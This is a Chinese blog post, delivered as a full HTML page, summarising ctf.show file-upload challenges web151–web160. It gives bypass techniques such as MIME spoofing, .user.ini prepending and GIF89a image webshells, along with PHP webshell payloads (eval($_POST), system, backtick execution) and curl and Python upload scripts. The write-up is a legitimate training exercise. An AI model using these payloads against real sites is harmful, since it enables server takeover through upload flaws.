@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF：文件上传（ctf.show）题目整理 - 上传 Payload构造</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@CTF：文件上传（ctf.show）题目整理 - 上传 Payload构造 - Hzhsrc home">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="http://118.178.86.67/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up5/">
+
+    <link rel="alternate" type="application/rss+xml" href="http://118.178.86.67//index.xml" title="Hzhsrc home">
+
+    
+
+
+    <meta property="og:title" content="CTF：文件上传（ctf.show）题目整理 - 上传 Payload构造" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://118.178.86.67/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up5/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2024-05-03T10:56:54+08:00" />
+<meta property="article:modified_time" content="2024-05-03T10:56:54+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CTF：文件上传（ctf.show）题目整理 - 上传 Payload构造"/>
+<meta name="twitter:description" content=""/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "http://118.178.86.67/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "基础漏洞",
+      "item": "http://118.178.86.67/list/base_bug/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "CTF：文件上传（ctf.show）题目整理 - 上传 Payload构造",
+      "item": "http://118.178.86.67/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up5/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CTF：文件上传（ctf.show）题目整理 - 上传 Payload构造",
+  "name": "CTF：文件上传（ctf.show）题目整理 - 上传 Payload构造",
+  "description": "",
+  "keywords": [
+    
+  ],
+  "articleBody": "概要 本文总结了我做ctfshow有关文件上传的漏洞题目,以及文件上传构造数据包的pyload\nctf.show — web151 ~ web160 条目整理（要点摘录） 下面每一项对应你给的编号（web151..web160），按“题目要点 / 绕过手法 / 常见 payload”格式列出，方便快速查阅。\nweb151 要点：前端 JS 校验绕过。 绕过思路：直接跳过浏览器界面，使用 Burp / curl / Python 直接构造 multipart/form-data 请求上传文件（不触发前端校验逻辑）。\n// 举例（思路） // 在浏览器中被阻止上传，但用 curl 直接发送上传表单即可绕过 JS 校验。 web152 要点：MIME 类型判断绕过。 绕过思路：修改上传文件的 Content-Type 为允许的 MIME（如 image/png）但实际内容为 PHP；或使用 php://filter、二次编码等后端绕过方式。\nContent-Type: image/png // 可伪造 web153 要点：同级目录已有 PHP 文件，可借助 .user.ini 绕过（或利用上传目录的解析/配置）。 绕过思路：上传特殊文件并配合 .user.ini（或其它配置）使上传文件能被作为 PHP 执行。\nweb154 - web155 要点：内容过滤（有对 PHP 关键字或标签的过滤），但存在大小写或其它替代写法绕过。 绕过示例：\n\u003c?=eval($_POST[a])?\u003e // 常见短标签 / eval 绕过形式（视题目过滤而定） web156 要点：对 php 与方括号 [] 的过滤。 绕过思路：用其他符号替代 []，或利用不同编码形式、伪协议等使过滤失效。 示例：用 {} 或其它字符尝试构造有效 payload（依题目过滤规则而定）。\nweb157 - web158 要点：题目把马基本锁死，但仍可任意执行 PHP 代码（即存在执行但难写入常见 webshell）。\n\u003c? system('tac fla*') ?\u003e web159 要点：过滤 () [] {} ; php 等字符，但反引号执行（``）或短标签可被利用执行命令。 示例 payload：\n\u003c?=`tac fla*`?\u003e web160 要点：过滤大量字符并检测文件头（magic bytes）；题目常要求绕过头部检测、日志包含、或借助 .user.ini。 典型技巧：\n修改文件头保持 magic bytes（例如 GIF89a）同时把 payload 嵌入图片中（或利用 .user.ini 设置 auto_prepend_file）。 使用 \".\" 拼接字符串来分割路径（例如包含日志 /var/log/nginx/access.log 分段拼接）。 示例 HTML 表单（CTF 利用场景）：\n\u003c!DOCTYPE html\u003e \" /\u003e multipart/form-data 简要说明（关键点） multipart/form-data 是浏览器上传文件时使用的媒体类型。数据体由多个部分（part）组成，每个 part 以 boundary 分隔。 每个 part 有 Content-Disposition（含 name、可选 filename）和可选 Content-Type。 后端解析时应严格校验 filename、Content-Type、真实文件内容（magic bytes）和文件扩展名。 构造上传 Payload（Raw HTTP 示例） POST /Pass-01/index.php HTTP/1.1 Host: 172.250.250.14 Content-Type: multipart/form-data; boundary=----15638190551882 Content-Length: 318 -----------------------------15638190551882 Content-Disposition: form-data; name=\"upload_file\"; filename=\"phpinfo.php\" Content-Type: application/octet-stream \u003c?php phpinfo();?\u003e -----------------------------15638190551882 Content-Disposition: form-data; name=\"submit\" 上传 -----------------------------15638190551882-- 常用的上传方式 1) curl curl -v -F \"upload_file=@phpinfo.php;type=application/octet-stream\" \\ -F \"submit=上传\" \\ http://172.250.250.14/Pass-01/index.php phpinfo.php 文件内容：\n\u003c?php phpinfo();?\u003e 2) Python脚本 import requests url = \"http://172.250.250.14/Pass-01/index.php\" files = { 'upload_file': ('phpinfo.php', b\"\u003c?php phpinfo();?\u003e\", 'application/octet-stream') } data = {'submit': '上传'} r = requests.post(url, files=files, data=data) print(r.status_code) print(r.text[:1000]) 3) 使用 Burp / Netcat 把上面的 Raw HTTP 到 Burp Repeater 或用 nc 直接发（注意 Content-Length 要正确，建议用 Burp 或 curl 自动计算）。 快速 Payload 模板（通用） 直接上传 PHP（若允许）： 文件名：phpinfo.php 内容：\u003c?php phpinfo();?\u003e 图片马（当允许 GIF/PNG 头）： 以 GIF89a 开头，后面拼接 PHP 代码或 \u003c?php ... ?\u003e，并配合 .user.ini 或 auto_prepend_file 等设置。 伪协议利用： php://input、php://filter、data://、phar://、zip:// 等，依据题目环境选择使用。 ",
+  "wordCount" : "292",
+  "inLanguage": "en",
+  "datePublished": "2024-05-03T10:56:54+08:00",
+  "dateModified": "2024-05-03T10:56:54+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://118.178.86.67/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up5/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsrc home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://118.178.86.67/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/images/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/hzhsec.png">
+
+<link rel="manifest" href="/images/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>CTF：文件上传（ctf.show）题目整理 - 上传 Payload构造</h1>
+  </header>
+
+  <p>
+  <small>
+    May 3, 2024&nbsp;· 292 words&nbsp;· 2 min</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#概要">概要</a></li>
+    <li><a href="#ctfshow--web151--web160-条目整理要点摘录">ctf.show — web151 ~ web160 条目整理（要点摘录）</a>
+      <ul>
+        <li><a href="#web151">web151</a></li>
+        <li><a href="#web152">web152</a></li>
+        <li><a href="#web153">web153</a></li>
+        <li><a href="#web154---web155">web154 - web155</a></li>
+        <li><a href="#web156">web156</a></li>
+        <li><a href="#web157---web158">web157 - web158</a></li>
+        <li><a href="#web159">web159</a></li>
+        <li><a href="#web160">web160</a></li>
+      </ul>
+    </li>
+    <li><a href="#multipartform-data-简要说明关键点">multipart/form-data 简要说明（关键点）</a></li>
+    <li><a href="#构造上传-payloadraw-http-示例">构造上传 Payload（Raw HTTP 示例）</a></li>
+    <li><a href="#常用的上传方式">常用的上传方式</a>
+      <ul>
+        <li><a href="#1-curl">1) curl</a></li>
+        <li><a href="#2-python脚本">2) Python脚本</a></li>
+        <li><a href="#3-使用-burp--netcat">3) 使用 Burp / Netcat</a></li>
+      </ul>
+    </li>
+    <li><a href="#快速-payload-模板通用">快速 Payload 模板（通用）</a></li>
+  </ul>
+</nav>
+  </div>
+
+  <section class="blog-content"><h2 id="概要">概要</h2>
+<p>本文总结了我做ctfshow有关文件上传的漏洞题目,以及文件上传构造数据包的pyload</p>
+<hr>
+<h2 id="ctfshow--web151--web160-条目整理要点摘录">ctf.show — web151 ~ web160 条目整理（要点摘录）</h2>
+<blockquote>
+<p>下面每一项对应你给的编号（web151..web160），按“题目要点 / 绕过手法 / 常见 payload”格式列出，方便快速查阅。</p>
+</blockquote>
+<h3 id="web151">web151</h3>
+<p><strong>要点</strong>：前端 JS 校验绕过。
+<strong>绕过思路</strong>：直接跳过浏览器界面，使用 Burp / curl / Python 直接构造 <code>multipart/form-data</code> 请求上传文件（不触发前端校验逻辑）。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>// 举例（思路）
+</span></span><span style="display:flex;"><span>// 在浏览器中被阻止上传，但用 curl 直接发送上传表单即可绕过 JS 校验。
+</span></span></code></pre></div><hr>
+<h3 id="web152">web152</h3>
+<p><strong>要点</strong>：MIME 类型判断绕过。
+<strong>绕过思路</strong>：修改上传文件的 <code>Content-Type</code> 为允许的 MIME（如 <code>image/png</code>）但实际内容为 PHP；或使用 <code>php://filter</code>、二次编码等后端绕过方式。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Content-Type: image/png  // 可伪造
+</span></span></code></pre></div><hr>
+<h3 id="web153">web153</h3>
+<p><strong>要点</strong>：同级目录已有 PHP 文件，可借助 <code>.user.ini</code> 绕过（或利用上传目录的解析/配置）。
+<strong>绕过思路</strong>：上传特殊文件并配合 <code>.user.ini</code>（或其它配置）使上传文件能被作为 PHP 执行。</p>
+<hr>
+<h3 id="web154---web155">web154 - web155</h3>
+<p><strong>要点</strong>：内容过滤（有对 PHP 关键字或标签的过滤），但存在大小写或其它替代写法绕过。
+<strong>绕过示例</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;?=eval($_POST[a])?&gt;    // 常见短标签 / eval 绕过形式（视题目过滤而定）
+</span></span></code></pre></div><hr>
+<h3 id="web156">web156</h3>
+<p><strong>要点</strong>：对 <code>php</code> 与方括号 <code>[]</code> 的过滤。
+<strong>绕过思路</strong>：用其他符号替代 <code>[]</code>，或利用不同编码形式、伪协议等使过滤失效。
+示例：用 <code>{}</code> 或其它字符尝试构造有效 payload（依题目过滤规则而定）。</p>
+<hr>
+<h3 id="web157---web158">web157 - web158</h3>
+<p><strong>要点</strong>：题目把马基本锁死，但仍可任意执行 PHP 代码（即存在执行但难写入常见 webshell）。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;? system(&#39;tac fla*&#39;) ?&gt;
+</span></span></code></pre></div><hr>
+<h3 id="web159">web159</h3>
+<p><strong>要点</strong>：过滤 <code>()</code> <code>[]</code> <code>{}</code> <code>;</code> <code>php</code> 等字符，但反引号执行（``）或短标签可被利用执行命令。
+<strong>示例 payload</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;?=`tac fla*`?&gt;
+</span></span></code></pre></div><hr>
+<h3 id="web160">web160</h3>
+<p><strong>要点</strong>：过滤大量字符并检测文件头（magic bytes）；题目常要求绕过头部检测、日志包含、或借助 <code>.user.ini</code>。
+<strong>典型技巧</strong>：</p>
+<ul>
+<li>修改文件头保持 magic bytes（例如 <code>GIF89a</code>）同时把 payload 嵌入图片中（或利用 <code>.user.ini</code> 设置 <code>auto_prepend_file</code>）。</li>
+<li>使用 <code>&quot;.&quot;</code> 拼接字符串来分割路径（例如包含日志 <code>/var/log/nginx/access.log</code> 分段拼接）。</li>
+</ul>
+<p><strong>示例 HTML 表单（CTF 利用场景）</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>&lt;html&gt;
+</span></span><span style="display:flex;"><span>&lt;body&gt;
+</span></span><span style="display:flex;"><span>&lt;form action=&#34;http://&lt;challenge-url&gt;/&#34; method=&#34;POST&#34; enctype=&#34;multipart/form-data&#34;&gt;
+</span></span><span style="display:flex;"><span>  &lt;input type=&#34;hidden&#34; name=&#34;PHP_SESSION_UPLOAD_PROGRESS&#34; value=&#34;&lt;?php system(&#39;tac ../f*&#39;)&#34;);?&gt;&#34; /&gt;
+</span></span><span style="display:flex;"><span>  &lt;input type=&#34;file&#34; name=&#34;file&#34; /&gt;
+</span></span><span style="display:flex;"><span>  &lt;input type=&#34;submit&#34; value=&#34;submit&#34; /&gt;
+</span></span><span style="display:flex;"><span>&lt;/form&gt;
+</span></span><span style="display:flex;"><span>&lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span></code></pre></div><hr>
+<h2 id="multipartform-data-简要说明关键点">multipart/form-data 简要说明（关键点）</h2>
+<ul>
+<li><code>multipart/form-data</code> 是浏览器上传文件时使用的媒体类型。数据体由多个部分（part）组成，每个 part 以 boundary 分隔。</li>
+<li>每个 part 有 <code>Content-Disposition</code>（含 <code>name</code>、可选 <code>filename</code>）和可选 <code>Content-Type</code>。</li>
+<li>后端解析时应严格校验 <code>filename</code>、<code>Content-Type</code>、真实文件内容（magic bytes）和文件扩展名。</li>
+</ul>
+<hr>
+<h2 id="构造上传-payloadraw-http-示例">构造上传 Payload（Raw HTTP 示例）</h2>
+<img src="/static/屏幕截图 2024-12-11 203230.png">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>POST /Pass-01/index.php HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 172.250.250.14
+</span></span><span style="display:flex;"><span>Content-Type: multipart/form-data; boundary=----15638190551882
+</span></span><span style="display:flex;"><span>Content-Length: 318
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------------------15638190551882
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;upload_file&#34;; filename=&#34;phpinfo.php&#34;
+</span></span><span style="display:flex;"><span>Content-Type: application/octet-stream
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;?php phpinfo();?&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------------------15638190551882
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;submit&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>上传
+</span></span><span style="display:flex;"><span>-----------------------------15638190551882--
+</span></span></code></pre></div><hr>
+<h2 id="常用的上传方式">常用的上传方式</h2>
+<h3 id="1-curl">1) curl</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>curl -v -F &#34;upload_file=@phpinfo.php;type=application/octet-stream&#34; \
+</span></span><span style="display:flex;"><span>     -F &#34;submit=上传&#34; \
+</span></span><span style="display:flex;"><span>     http://172.250.250.14/Pass-01/index.php
+</span></span></code></pre></div><p><code>phpinfo.php</code> 文件内容：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;?php phpinfo();?&gt;
+</span></span></code></pre></div><h3 id="2-python脚本">2) Python脚本</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>import requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url = &#34;http://172.250.250.14/Pass-01/index.php&#34;
+</span></span><span style="display:flex;"><span>files = {
+</span></span><span style="display:flex;"><span>    &#39;upload_file&#39;: (&#39;phpinfo.php&#39;, b&#34;&lt;?php phpinfo();?&gt;&#34;, &#39;application/octet-stream&#39;)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>data = {&#39;submit&#39;: &#39;上传&#39;}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r = requests.post(url, files=files, data=data)
+</span></span><span style="display:flex;"><span>print(r.status_code)
+</span></span><span style="display:flex;"><span>print(r.text[:1000])
+</span></span></code></pre></div><h3 id="3-使用-burp--netcat">3) 使用 Burp / Netcat</h3>
+<ul>
+<li>把上面的 Raw HTTP 到 Burp Repeater 或用 <code>nc</code> 直接发（注意 <code>Content-Length</code> 要正确，建议用 Burp 或 curl 自动计算）。</li>
+</ul>
+<hr>
+<h2 id="快速-payload-模板通用">快速 Payload 模板（通用）</h2>
+<ul>
+<li><strong>直接上传 PHP</strong>（若允许）：
+<ul>
+<li>文件名：<code>phpinfo.php</code></li>
+<li>内容：<code>&lt;?php phpinfo();?&gt;</code></li>
+</ul>
+</li>
+<li><strong>图片马（当允许 GIF/PNG 头）</strong>：
+<ul>
+<li>以 <code>GIF89a</code> 开头，后面拼接 PHP 代码或 <code>&lt;?php ... ?&gt;</code>，并配合 <code>.user.ini</code> 或 <code>auto_prepend_file</code> 等设置。</li>
+</ul>
+</li>
+<li><strong>伪协议利用</strong>：
+<ul>
+<li><code>php://input</code>、<code>php://filter</code>、<code>data://</code>、<code>phar://</code>、<code>zip://</code> 等，依据题目环境选择使用。</li>
+</ul>
+</li>
+</ul></section>
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql4/">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>MySQL进阶：二次注入、堆叠注入与带外</span></a>
+    
+    
+    <a class="next" href="http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sqlmap/"><span>sqlmap 使用速查与进阶技巧</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="http://118.178.86.67/">Hzhsrc home</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
+  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
